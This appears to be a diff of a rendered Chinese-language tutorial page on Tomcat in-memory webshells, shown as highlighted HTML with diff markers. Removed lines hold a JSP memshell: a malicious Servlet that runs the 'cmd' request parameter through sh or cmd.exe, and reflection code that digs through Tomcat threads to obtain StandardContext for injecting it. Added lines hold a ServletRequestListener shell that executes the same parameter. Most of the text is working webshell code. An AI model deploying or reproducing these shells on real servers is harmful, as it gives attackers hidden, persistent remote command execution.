+  <span class="n">Date</span><span class="o">:</span> <span class="n">7</span><span class="o">/</span><span class="n">22</span><span class="o">/</span><span class="n">22</span>
+  <span class="n">Time</span><span class="o">:</span> <span class="n">15</span><span class="o">:</span><span class="n">50</span>
   <span class="n">To</span> <span class="n">change</span> <span class="k">this</span> <span class="n">template</span> <span class="n">use</span> <span class="n">File</span> <span class="o">|</span> <span class="n">Settings</span> <span class="o">|</span> <span class="n">File</span> <span class="n">Templates</span><span class="o">.</span>
 <span class="o">--%&gt;</span>
 <span class="o">&lt;%</span><span class="err">@</span> <span class="n">page</span> <span class="n">contentType</span><span class="o">=</span><span class="s">"text/html;charset=UTF-8"</span> <span class="n">language</span><span class="o">=</span><span class="s">"java"</span> <span class="o">%&gt;</span>
-<span class="o">&lt;%</span><span class="err">@</span> <span class="n">page</span> <span class="n">import</span><span class="o">=</span><span class="s">"java.io.IOException"</span> <span class="o">%&gt;</span>
-<span class="o">&lt;%</span><span class="err">@</span> <span class="n">page</span> <span class="n">import</span><span class="o">=</span><span class="s">"java.io.InputStream"</span>    <span class="o">%&gt;</span>
-<span class="o">&lt;%</span><span class="err">@</span> <span class="n">page</span> <span class="n">import</span><span class="o">=</span><span class="s">"java.util.Scanner"</span> <span class="o">%&gt;</span>
-<span class="o">&lt;%</span><span class="err">@</span> <span class="n">page</span> <span class="n">import</span><span class="o">=</span><span class="s">"org.apache.catalina.core.StandardContext"</span> <span class="o">%&gt;</span>
-<span class="o">&lt;%</span><span class="err">@</span> <span class="n">page</span> <span class="n">import</span><span class="o">=</span><span class="s">"java.io.PrintWriter"</span> <span class="o">%&gt;</span>
-<span class="o">&lt;%</span><span class="err">@</span> <span class="n">page</span> <span class="n">import</span><span class="o">=</span><span class="s">"org.apache.catalina.core.StandardEngine"</span> <span class="o">%&gt;</span>
-<span class="o">&lt;%</span><span class="err">@</span> <span class="n">page</span> <span class="n">import</span><span class="o">=</span><span class="s">"java.util.HashMap"</span> <span class="o">%&gt;</span>
-<span class="o">&lt;%</span><span class="err">@</span> <span class="n">page</span> <span class="n">import</span><span class="o">=</span><span class="s">"org.apache.catalina.core.StandardHost"</span> <span class="o">%&gt;</span>
-<span class="o">&lt;%</span><span class="err">@</span> <span class="n">page</span> <span class="n">import</span><span class="o">=</span><span class="s">"java.util.Iterator"</span> <span class="o">%&gt;</span>
-<span class="o">&lt;%</span><span class="err">@</span> <span class="n">page</span> <span class="n">import</span><span class="o">=</span><span class="s">"java.lang.reflect.Field"</span><span class="o">%&gt;</span>
-
 <span class="o">&lt;</span><span class="n">html</span><span class="o">&gt;</span>
 <span class="o">&lt;</span><span class="n">head</span><span class="o">&gt;</span>
-    <span class="o">&lt;</span><span class="n">title</span><span class="o">&gt;</span><span class="n">Memshell</span><span class="o">&lt;/</span><span class="n">title</span><span class="o">&gt;</span>
-
-    <span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">以tomcat的servletAPI型内存马为例讲一下内存马的实现</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
-    <span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">先是创建了一个恶意的servlet</span><span class="err">，</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
-    <span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">然后获取当前的StandardContext</span><span class="err">，</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
-    <span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">然后将恶意servlet封装成wrapper添加到StandardContext的children当中</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
-    <span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">最后添加ServletMapping将访问的URL和wrapper进行绑定</span><span class="err">。</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
-
+    <span class="o">&lt;</span><span class="n">title</span><span class="o">&gt;</span><span class="n">Listener</span> <span class="n">Shell</span><span class="o">&lt;/</span><span class="n">title</span><span class="o">&gt;</span>
 <span class="o">&lt;/</span><span class="n">head</span><span class="o">&gt;</span>
 <span class="o">&lt;</span><span class="n">body</span><span class="o">&gt;</span>
 <span class="o">&lt;%</span>
-    <span class="c1">// 创建恶意Serlvet
-</span><span class="c1"></span>    <span class="n">Servlet</span> <span class="n">servlet</span><span class="o">=</span> <span class="k">new</span> <span class="n">Servlet</span><span class="o">(){</span>
+    <span class="kd">class</span> <span class="nc">ListenerShell</span> <span class="kd">implements</span> <span class="n">ServletRequestListener</span> <span class="o">{</span>
         <span class="nd">@Override</span>
-        <span class="kd">public</span> <span class="kt">void</span> <span class="nf">service</span><span class="o">(</span><span class="n">ServletRequest</span> <span class="n">servletRequest</span><span class="o">,</span> <span class="n">ServletResponse</span> <span class="n">servletResponse</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">ServletException</span><span class="o">,</span><span class="n">IOException</span><span class="o">{</span>
-            <span class="n">String</span> <span class="n">cmd</span> <span class="o">=</span> <span class="n">servletRequest</span><span class="o">.</span><span class="na">getParameter</span><span class="o">(</span><span class="s">"cmd"</span><span class="o">);</span>
-            <span class="kt">boolean</span> <span class="n">isLinux</span><span class="o">=</span><span class="kc">true</span><span class="o">;</span>
-            <span class="n">String</span> <span class="n">osType</span> <span class="o">=</span> <span class="n">System</span><span class="o">.</span><span class="na">getProperty</span><span class="o">(</span><span class="s">"os.name"</span><span class="o">);</span>
-            <span class="k">if</span><span class="o">(</span><span class="n">osType</span> <span class="o">!=</span><span class="kc">null</span> <span class="o">&amp;&amp;</span> <span class="n">osType</span><span class="o">.</span><span class="na">toLowerCase</span><span class="o">().</span><span class="na">contains</span><span class="o">(</span><span class="s">"win"</span><span class="o">)){</span>
-                <span class="n">isLinux</span><span class="o">=</span><span class="kc">false</span><span class="o">;</span>
-            <span class="o">}</span>
-
-            <span class="n">String</span><span class="o">[]</span> <span class="n">cmds</span><span class="o">=</span><span class="n">isLinux</span> <span class="o">?</span> <span class="k">new</span> <span class="n">String</span><span class="o">[]{</span><span class="s">"sh"</span><span class="o">,</span> <span class="s">"-c"</span><span class="o">,</span> <span class="n">cmd</span><span class="o">}</span> <span class="o">:</span> <span class="k">new</span> <span class="n">String</span><span class="o">[]{</span><span class="s">"cmd.exe"</span><span class="o">,</span><span class="s">"/c"</span><span class="o">,</span><span class="n">cmd</span><span class="o">};</span>
-            <span class="n">InputStream</span> <span class="n">inputStream</span> <span class="o">=</span> <span class="n">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">exec</span><span class="o">(</span><span class="n">cmds</span><span class="o">).</span><span class="na">getInputStream</span><span class="o">();</span>
-            <span class="n">Scanner</span> <span class="n">scanner</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Scanner</span><span class="o">(</span><span class="n">inputStream</span><span class="o">).</span><span class="na">useDelimiter</span><span class="o">(</span><span class="s">"\\a"</span><span class="o">);</span>
-            <span class="n">String</span> <span class="n">output</span> <span class="o">=</span><span class="n">scanner</span><span class="o">.</span><span class="na">hasNext</span><span class="o">()?</span> <span class="n">scanner</span><span class="o">.</span><span class="na">next</span><span class="o">()</span> <span class="o">:</span> <span class="s">""</span><span class="o">;</span>
-            <span class="n">PrintWriter</span> <span class="n">out</span> <span class="o">=</span> <span class="n">response</span><span class="o">.</span><span class="na">getWriter</span><span class="o">();</span>
-            <span class="n">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">output</span><span class="o">);</span>
-            <span class="n">out</span><span class="o">.</span><span class="na">flush</span><span class="o">();</span>
-            <span class="n">out</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
+        <span class="kd">public</span> <span class="kt">void</span> <span class="nf">requestDestroyed</span><span class="o">(</span><span class="n">ServletRequestEvent</span> <span class="n">sre</span><span class="o">)</span> <span class="o">{</span>
+            <span class="n">ServletRequestListener</span><span class="o">.</span><span class="na">super</span><span class="o">.</span><span class="na">requestDestroyed</span><span class="o">(</span><span class="n">sre</span><span class="o">);</span>
+            <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"销毁。。。"</span><span class="o">);</span>
         <span class="o">}</span>
-        <span class="nd">@Override</span>
-        <span class="kd">public</span> <span class="kt">void</span> <span class="nf">init</span><span class="o">(</span><span class="n">ServletConfig</span> <span class="n">servletConfig</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">ServletException</span><span class="o">{}</span>
-        <span class="nd">@Override</span>
-        <span class="kd">public</span> <span class="n">ServletConfig</span> <span class="nf">getServletConfig</span><span class="o">(){</span><span class="k">return</span>  <span class="kc">null</span><span class="o">;}</span>
-        <span class="nd">@Override</span>
-        <span class="kd">public</span> <span class="n">String</span> <span class="nf">getServletInfo</span><span class="o">(){</span><span class="k">return</span> <span class="kc">null</span><span class="o">;}</span>
-        <span class="nd">@Override</span>
-        <span class="kd">public</span> <span class="kt">void</span> <span class="nf">destroy</span><span class="o">(){}</span>
-    <span class="o">};</span>
-<span class="o">%&gt;</span>
 
-</code></pre></td></tr></table>
-</div>
-</div><h2 id="获取当前的standardcontext">获取当前的StandardContext</h2>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre class="chroma" tabindex="0"><code><span class="lnt">  1
-</span><span class="lnt">  2
-</span><span class="lnt">  3
-</span><span class="lnt">  4
-</span><span class="lnt">  5
-</span><span class="lnt">  6
-</span><span class="lnt">  7
-</span><span class="lnt">  8
-</span><span class="lnt">  9
-</span><span class="lnt"> 10
-</span><span class="lnt"> 11
-</span><span class="lnt"> 12
-</span><span class="lnt"> 13
-</span><span class="lnt"> 14
-</span><span class="lnt"> 15
-</span><span class="lnt"> 16
-</span><span class="lnt"> 17
-</span><span class="lnt"> 18
-</span><span class="lnt"> 19
-</span><span class="lnt"> 20
-</span><span class="lnt"> 21
-</span><span class="lnt"> 22
-</span><span class="lnt"> 23
-</span><span class="lnt"> 24
-</span><span class="lnt"> 25
-</span><span class="lnt"> 26
-</span><span class="lnt"> 27
-</span><span class="lnt"> 28
-</span><span class="lnt"> 29
-</span><span class="lnt"> 30
-</span><span class="lnt"> 31
-</span><span class="lnt"> 32
-</span><span class="lnt"> 33
-</span><span class="lnt"> 34
-</span><span class="lnt"> 35
-</span><span class="lnt"> 36
-</span><span class="lnt"> 37
-</span><span class="lnt"> 38
-</span><span class="lnt"> 39
-</span><span class="lnt"> 40
-</span><span class="lnt"> 41
-</span><span class="lnt"> 42
-</span><span class="lnt"> 43
-</span><span class="lnt"> 44
-</span><span class="lnt"> 45
-</span><span class="lnt"> 46
-</span><span class="lnt"> 47
-</span><span class="lnt"> 48
-</span><span class="lnt"> 49
-</span><span class="lnt"> 50
-</span><span class="lnt"> 51
-</span><span class="lnt"> 52
-</span><span class="lnt"> 53
-</span><span class="lnt"> 54
-</span><span class="lnt"> 55
-</span><span class="lnt"> 56
-</span><span class="lnt"> 57
-</span><span class="lnt"> 58
-</span><span class="lnt"> 59
-</span><span class="lnt"> 60
-</span><span class="lnt"> 61
-</span><span class="lnt"> 62
-</span><span class="lnt"> 63
-</span><span class="lnt"> 64
-</span><span class="lnt"> 65
-</span><span class="lnt"> 66
-</span><span class="lnt"> 67
-</span><span class="lnt"> 68
-</span><span class="lnt"> 69
-</span><span class="lnt"> 70
-</span><span class="lnt"> 71
-</span><span class="lnt"> 72
-</span><span class="lnt"> 73
-</span><span class="lnt"> 74
-</span><span class="lnt"> 75
-</span><span class="lnt"> 76
-</span><span class="lnt"> 77
-</span><span class="lnt"> 78
-</span><span class="lnt"> 79
-</span><span class="lnt"> 80
-</span><span class="lnt"> 81
-</span><span class="lnt"> 82
-</span><span class="lnt"> 83
-</span><span class="lnt"> 84
-</span><span class="lnt"> 85
-</span><span class="lnt"> 86
-</span><span class="lnt"> 87
-</span><span class="lnt"> 88
-</span><span class="lnt"> 89
-</span><span class="lnt"> 90
-</span><span class="lnt"> 91
-</span><span class="lnt"> 92
-</span><span class="lnt"> 93
-</span><span class="lnt"> 94
-</span><span class="lnt"> 95
-</span><span class="lnt"> 96
-</span><span class="lnt"> 97
-</span><span class="lnt"> 98
-</span><span class="lnt"> 99
-</span><span class="lnt">100
-</span><span class="lnt">101
-</span><span class="lnt">102
-</span><span class="lnt">103
-</span><span class="lnt">104
-</span><span class="lnt">105
-</span><span class="lnt">106
-</span><span class="lnt">107
-</span><span class="lnt">108
-</span><span class="lnt">109
-</span><span class="lnt">110
-</span><span class="lnt">111
-</span><span class="lnt">112
-</span><span class="lnt">113
-</span><span class="lnt">114
-</span><span class="lnt">115
-</span><span class="lnt">116
-</span><span class="lnt">117
-</span><span class="lnt">118
-</span><span class="lnt">119
-</span><span class="lnt">120
-</span><span class="lnt">121
-</span><span class="lnt">122
-</span><span class="lnt">123
-</span><span class="lnt">124
-</span><span class="lnt">125
-</span><span class="lnt">126
-</span><span class="lnt">127
-</span><span class="lnt">128
-</span><span class="lnt">129
-</span><span class="lnt">130
-</span><span class="lnt">131
-</span><span class="lnt">132
-</span><span class="lnt">133
-</span></code></pre></td>
-<td class="lntd">
-<pre class="chroma" tabindex="0"><code class="language-java" data-lang="java"><span class="o">&lt;%</span>
-    <span class="c1">// 获取当前的StandardContext  以下方式失效
-</span><span class="c1"></span>    <span class="c1">// org.apache.catalina.loader.WebappClassLoaderBase webappClassLoaderBase =
-</span><span class="c1"></span>    <span class="c1">//         (org.apache.catalina.loader.WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
-</span><span class="c1"></span>    <span class="c1">// StandardContext standardCtx = (StandardContext)webappClassLoaderBase.getResources().getContext();
-</span><span class="c1"></span>
-    <span class="c1">// Tomcat全版本下获取StandardContext对象
-</span><span class="c1"></span>    <span class="kd">class</span> <span class="nc">Tomcat6789</span> <span class="o">{</span>
-        <span class="n">String</span> <span class="n">uri</span><span class="o">;</span>
-        <span class="n">String</span> <span class="n">serverName</span><span class="o">;</span>
-        <span class="n">StandardContext</span> <span class="n">standardContext</span><span class="o">;</span>
-        <span class="kd">public</span> <span class="n">Object</span> <span class="nf">getField</span><span class="o">(</span><span class="n">Object</span> <span class="n">object</span><span class="o">,</span> <span class="n">String</span> <span class="n">fieldName</span><span class="o">)</span> <span class="o">{</span>
-            <span class="n">Field</span> <span class="n">declaredField</span><span class="o">;</span>
-            <span class="n">Class</span> <span class="n">clazz</span> <span class="o">=</span> <span class="n">object</span><span class="o">.</span><span class="na">getClass</span><span class="o">();</span>
-            <span class="k">while</span> <span class="o">(</span><span class="n">clazz</span> <span class="o">!=</span> <span class="n">Object</span><span class="o">.</span><span class="na">class</span><span class="o">)</span> <span class="o">{</span>
+        <span class="nd">@Override</span>
+        <span class="kd">public</span> <span class="kt">void</span> <span class="nf">requestInitialized</span><span class="o">(</span><span class="n">ServletRequestEvent</span> <span class="n">sre</span><span class="o">)</span> <span class="o">{</span>
+            <span class="n">ServletRequestListener</span><span class="o">.</span><span class="na">super</span><span class="o">.</span><span class="na">requestInitialized</span><span class="o">(</span><span class="n">sre</span><span class="o">);</span>
+            <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"初始化。。。"</span><span class="o">);</span>
+            <span class="k">if</span> <span class="o">(</span> <span class="n">sre</span><span class="o">.</span><span class="na">getServletRequest</span><span class="o">().</span><span class="na">getParameter</span><span class="o">(</span><span class="s">"cmd"</span><span class="o">)</span> <span class="o">!=</span> <span class="kc">null</span> <span class="o">){</span>
+
+                <span class="kt">boolean</span> <span class="n">isWin</span> <span class="o">=</span> <span class="n">System</span><span class="o">.</span><span class="na">getProperty</span><span class="o">(</span><span class="s">"os.name"</span><span class="o">).</span><span class="na">toLowerCase</span><span class="o">().</span><span class="na">contains</span><span class="o">(</span><span class="s">"win"</span><span class="o">);</span>
+                <span class="n">String</span><span class="o">[]</span> <span class="n">cmds</span> <span class="o">=</span> <span class="n">isWin</span> <span class="o">?</span> <span class="k">new</span> <span class="n">String</span><span class="o">[]{</span><span class="s">"cmd.exe"</span><span class="o">,</span><span class="s">"/c"</span><span class="o">,</span> <span class="n">sre</span><span class="o">.</span><span class="na">getServletRequest</span><span class="o">().</span><span class="na">getParameter</span><span class="o">(</span><span class="s">"cmd"</span><span class="o">)}</span>
+                        <span class="o">:</span> <span class="k">new</span> <span class="n">String</span><span class="o">[]{</span><span class="s">"sh"</span><span class="o">,</span><span class="s">"-c"</span><span class="o">,</span><span class="n">sre</span><span class="o">.</span><span class="na">getServletRequest</span><span class="o">().</span><span class="na">getParameter</span><span class="o">(</span><span class="s">"cmd"</span><span class="o">)};</span>
+
+                <span class="n">Scanner</span> <span class="n">scanner</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
                 <span class="k">try</span> <span class="o">{</span>
-
-                    <span class="n">declaredField</span> <span class="o">=</span> <span class="n">clazz</span><span class="o">.</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="n">fieldName</span><span class="o">);</span>
-                    <span class="n">declaredField</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
-                    <span class="k">return</span> <span class="n">declaredField</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">object</span><span class="o">);</span>
-                <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">NoSuchFieldException</span> <span class="n">e</span><span class="o">){}</span>
-                <span class="k">catch</span> <span class="o">(</span><span class="n">IllegalAccessException</span> <span class="n">e</span><span class="o">){}</span>
-                <span class="n">clazz</span> <span class="o">=</span> <span class="n">clazz</span><span class="o">.</span><span class="na">getSuperclass</span><span class="o">();</span>
+                    <span class="n">scanner</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Scanner</span><span class="o">(</span><span class="n">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">exec</span><span class="o">(</span><span class="n">cmds</span><span class="o">).</span><span class="na">getInputStream</span><span class="o">()).</span><span class="na">useDelimiter</span><span class="o">(</span><span class="s">"\\A"</span><span class="o">);</span>
+                <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">IOException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+                    <span class="k">throw</span> <span class="k">new</span> <span class="n">RuntimeException</span><span class="o">(</span><span class="n">e</span><span class="o">);</span>
+                <span class="o">}</span>
+                <span class="n">String</span> <span class="n">result</span> <span class="o">=</span> <span class="n">scanner</span><span class="o">.</span><span class="na">hasNext</span><span class="o">()</span> <span class="o">?</span> <span class="n">scanner</span><span class="o">.</span><span class="na">next</span><span class="o">()</span> <span class="o">:</span> <span class="s">""</span><span class="o">;</span>
+                <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">result</span><span class="o">);</span>
             <span class="o">}</span>
-            <span class="k">return</span> <span class="kc">null</span><span class="o">;</span>
-        <span class="o">}</span>
 
-        <span class="kd">public</span> <span class="nf">Tomcat6789</span><span class="o">()</span> <span class="o">{</span>
-            <span class="n">Thread</span><span class="o">[]</span> <span class="n">threads</span> <span class="o">=</span> <span class="o">(</span><span class="n">Thread</span><span class="o">[])</span> <span class="k">this</span><span class="o">.</span><span class="na">getField</span><span class="o">(</span><span class="n">Thread</span><span class="o">.</span><span class="na">currentThread</span><span class="o">().</span><span class="na">getThreadGroup</span><span class="o">(),</span> <span class="s">"threads"</span><span class="o">);</span>
-            <span class="n">Object</span> <span class="n">object</span><span class="o">;</span>
-            <span class="k">for</span> <span class="o">(</span><span class="n">Thread</span> <span class="n">thread</span> <span class="o">:</span> <span class="n">threads</span><span class="o">)</span> <span class="o">{</span>
-
-                <span class="k">if</span> <span class="o">(</span><span class="n">thread</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
-                    <span class="k">continue</span><span class="o">;</span>
-                <span class="o">}</span>
-                <span class="k">if</span> <span class="o">(</span><span class="n">thread</span><span class="o">.</span><span class="na">getName</span><span class="o">().</span><span class="na">contains</span><span class="o">(</span><span class="s">"exec"</span><span class="o">))</span> <span class="o">{</span>
-                    <span class="k">continue</span><span class="o">;</span>
-                <span class="o">}</span>
-                <span class="n">Object</span> <span class="n">target</span> <span class="o">=</span> <span class="k">this</span><span class="o">.</span><span class="na">getField</span><span class="o">(</span><span class="n">thread</span><span class="o">,</span> <span class="s">"target"</span><span class="o">);</span>
-                <span class="k">if</span> <span class="o">(!(</span><span class="n">target</span> <span class="k">instanceof</span> <span class="n">Runnable</span><span class="o">))</span> <span class="o">{</span>
-                    <span class="k">continue</span><span class="o">;</span>
-                <span class="o">}</span>
-
-                <span class="k">try</span> <span class="o">{</span>
-                    <span class="n">object</span> <span class="o">=</span> <span class="n">getField</span><span class="o">(</span><span class="n">getField</span><span class="o">(</span><span class="n">getField</span><span class="o">(</span><span class="n">target</span><span class="o">,</span> <span class="s">"this$0"</span><span class="o">),</span> <span class="s">"handler"</span><span class="o">),</span> <span class="s">"global"</span><span class="o">);</span>
-                <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
-                    <span class="k">continue</span><span class="o">;</span>
-                <span class="o">}</span>
-                <span class="k">if</span> <span class="o">(</span><span class="n">object</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
-                    <span class="k">continue</span><span class="o">;</span>
-                <span class="o">}</span>
-                <span class="n">java</span><span class="o">.</span><span class="na">util</span><span class="o">.</span><span class="na">ArrayList</span> <span class="n">processors</span> <span class="o">=</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">util</span><span class="o">.</span><span class="na">ArrayList</span><span class="o">)</span> <span class="n">getField</span><span class="o">(</span><span class="n">object</span><span class="o">,</span> <span class="s">"processors"</span><span class="o">);</span>
-                <span class="n">Iterator</span> <span class="n">iterator</span> <span class="o">=</span> <span class="n">processors</span><span class="o">.</span><span class="na">iterator</span><span class="o">();</span>
-                <span class="k">while</span> <span class="o">(</span><span class="n">iterator</span><span class="o">.</span><span class="na">hasNext</span><span class="o">())</span> <span class="o">{</span>
-                    <span class="n">Object</span> <span class="n">next</span> <span class="o">=</span> <span class="n">iterator</span><span class="o">.</span><span class="na">next</span><span class="o">();</span>
-
-                    <span class="n">Object</span> <span class="n">req</span> <span class="o">=</span> <span class="n">getField</span><span class="o">(</span><span class="n">next</span><span class="o">,</span> <span class="s">"req"</span><span class="o">);</span>
-                    <span class="n">Object</span> <span class="n">serverPort</span> <span class="o">=</span> <span class="n">getField</span><span class="o">(</span><span class="n">req</span><span class="o">,</span> <span class="s">"serverPort"</span><span class="o">);</span>
-                    <span class="k">if</span> <span class="o">(</span><span class="n">serverPort</span><span class="o">.</span><span class="na">equals</span><span class="o">(-</span><span class="n">1</span><span class="o">)){</span><span class="k">continue</span><span class="o">;}</span>
-                    <span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">tomcat</span><span class="o">.</span><span class="na">util</span><span class="o">.</span><span class="na">buf</span><span class="o">.</span><span class="na">MessageBytes</span> <span class="n">serverNameMB</span> <span class="o">=</span> <span class="o">(</span><span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">tomcat</span><span class="o">.</span><span class="na">util</span><span class="o">.</span><span class="na">buf</span><span class="o">.</span><span class="na">MessageBytes</span><span class="o">)</span> <span class="n">getField</span><span class="o">(</span><span class="n">req</span><span class="o">,</span> <span class="s">"serverNameMB"</span><span class="o">);</span>
-                    <span class="k">this</span><span class="o">.</span><span class="na">serverName</span> <span class="o">=</span> <span class="o">(</span><span class="n">String</span><span class="o">)</span> <span class="n">getField</span><span class="o">(</span><span class="n">serverNameMB</span><span class="o">,</span> <span class="s">"strValue"</span><span class="o">);</span>
-                    <span class="k">if</span> <span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">serverName</span> <span class="o">==</span> <span class="kc">null</span><span class="o">){</span>
-                        <span class="k">this</span><span class="o">.</span><span class="na">serverName</span> <span class="o">=</span> <span class="n">serverNameMB</span><span class="o">.</span><span class="na">toString</span><span class="o">();</span>
-                    <span class="o">}</span>
-                    <span class="k">if</span> <span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">serverName</span> <span class="o">==</span> <span class="kc">null</span><span class="o">){</span>
-                        <span class="k">this</span><span class="o">.</span><span class="na">serverName</span> <span class="o">=</span> <span class="n">serverNameMB</span><span class="o">.</span><span class="na">getString</span><span class="o">();</span>
-                    <span class="o">}</span>
-
-                    <span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">tomcat</span><span class="o">.</span><span class="na">util</span><span class="o">.</span><span class="na">buf</span><span class="o">.</span><span class="na">MessageBytes</span> <span class="n">uriMB</span> <span class="o">=</span> <span class="o">(</span><span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">tomcat</span><span class="o">.</span><span class="na">util</span><span class="o">.</span><span class="na">buf</span><span class="o">.</span><span class="na">MessageBytes</span><span class="o">)</span> <span class="n">getField</span><span class="o">(</span><span class="n">req</span><span class="o">,</span> <span class="s">"uriMB"</span><span class="o">);</span>
-                    <span class="k">this</span><span class="o">.</span><span class="na">uri</span> <span class="o">=</span> <span class="o">(</span><span class="n">String</span><span class="o">)</span> <span class="n">getField</span><span class="o">(</span><span class="n">uriMB</span><span class="o">,</span> <span class="s">"strValue"</span><span class="o">);</span>
-                    <span class="k">if</span> <span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">uri</span> <span class="o">==</span> <span class="kc">null</span><span class="o">){</span>
-                        <span class="k">this</span><span class="o">.</span><span class="na">uri</span> <span class="o">=</span> <span class="n">uriMB</span><span class="o">.</span><span class="na">toString</span><span class="o">();</span>
-                    <span class="o">}</span>
-                    <span class="k">if</span> <span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">uri</span> <span class="o">==</span> <span class="kc">null</span><span class="o">){</span>
-                        <span class="k">this</span><span class="o">.</span><span class="na">uri</span> <span class="o">=</span> <span class="n">uriMB</span><span class="o">.</span><span class="na">getString</span><span class="o">();</span>
-                    <span class="o">}</span>
-
-                    <span class="k">this</span><span class="o">.</span><span class="na">getStandardContext</span><span class="o">();</span>
-                    <span class="k">return</span><span class="o">;</span>
-                <span class="o">}</span>
-            <span class="o">}</span>
-        <span class="o">}</span>
-
-        <span class="kd">public</span> <span class="kt">void</span> <span class="nf">getStandardContext</span><span class="o">()</span> <span class="o">{</span>
-            <span class="n">Thread</span><span class="o">[]</span> <span class="n">threads</span> <span class="o">=</span> <span class="o">(</span><span class="n">Thread</span><span class="o">[])</span> <span class="k">this</span><span class="o">.</span><span class="na">getField</span><span class="o">(</span><span class="n">Thread</span><span class="o">.</span><span class="na">currentThread</span><span class="o">().</span><span class="na">getThreadGroup</span><span class="o">(),</span> <span class="s">"threads"</span><span class="o">);</span>
-            <span class="k">for</span> <span class="o">(</span><span class="n">Thread</span> <span class="n">thread</span> <span class="o">:</span> <span class="n">threads</span><span class="o">)</span> <span class="o">{</span>
-                <span class="k">if</span> <span class="o">(</span><span class="n">thread</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
-                    <span class="k">continue</span><span class="o">;</span>
-                <span class="o">}</span>
-                <span class="k">if</span> <span class="o">((</span><span class="n">thread</span><span class="o">.</span><span class="na">getName</span><span class="o">().</span><span class="na">contains</span><span class="o">(</span><span class="s">"Acceptor"</span><span class="o">))</span> <span class="o">&amp;&amp;</span> <span class="o">(</span><span class="n">thread</span><span class="o">.</span><span class="na">getName</span><span class="o">().</span><span class="na">contains</span><span class="o">(</span><span class="s">"http"</span><span class="o">)))</span> <span class="o">{</span>
-                    <span class="n">Object</span> <span class="n">target</span> <span class="o">=</span> <span class="k">this</span><span class="o">.</span><span class="na">getField</span><span class="o">(</span><span class="n">thread</span><span class="o">,</span> <span class="s">"target"</span><span class="o">);</span>
-                    <span class="n">HashMap</span> <span class="n">children</span><span class="o">;</span>
-                    <span class="n">Object</span> <span class="n">jioEndPoint</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
-                    <span class="k">try</span> <span class="o">{</span>
-                        <span class="n">jioEndPoint</span> <span class="o">=</span> <span class="n">getField</span><span class="o">(</span><span class="n">target</span><span class="o">,</span> <span class="s">"this$0"</span><span class="o">);</span>
-                    <span class="o">}</span><span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">){}</span>
-                    <span class="k">if</span> <span class="o">(</span><span class="n">jioEndPoint</span> <span class="o">==</span> <span class="kc">null</span><span class="o">){</span>
-                        <span class="k">try</span><span class="o">{</span>
-                            <span class="n">jioEndPoint</span> <span class="o">=</span> <span class="n">getField</span><span class="o">(</span><span class="n">target</span><span class="o">,</span> <span class="s">"endpoint"</span><span class="o">);</span>
-                        <span class="o">}</span><span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">){</span> <span class="k">return</span><span class="o">;</span> <span class="o">}</span>
-                    <span class="o">}</span>
-                    <span class="n">Object</span> <span class="n">service</span> <span class="o">=</span> <span class="n">getField</span><span class="o">(</span><span class="n">getField</span><span class="o">(</span><span class="n">getField</span><span class="o">(</span><span class="n">getField</span><span class="o">(</span><span class="n">getField</span><span class="o">(</span><span class="n">jioEndPoint</span><span class="o">,</span> <span class="s">"handler"</span><span class="o">),</span> <span class="s">"proto"</span><span class="o">),</span> <span class="s">"adapter"</span><span class="o">),</span> <span class="s">"connector"</span><span class="o">),</span> <span class="s">"service"</span><span class="o">);</span>
